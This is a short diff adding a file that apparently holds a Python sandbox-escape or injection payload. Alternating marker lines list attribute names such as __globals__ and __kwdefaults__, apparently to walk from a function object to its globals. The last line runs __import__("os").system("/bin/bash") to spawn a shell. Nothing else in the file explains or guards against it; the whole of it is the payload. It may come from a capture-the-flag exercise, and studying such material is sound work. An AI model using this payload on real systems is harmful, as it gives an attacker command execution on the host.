@@ -1,0 +1,12 @@
+K
+__str__
+K
+__globals__
+K
+log
+K
+__kwdefaults__
+K
+fnc
+S
+__import__("os").system("/bin/bash")
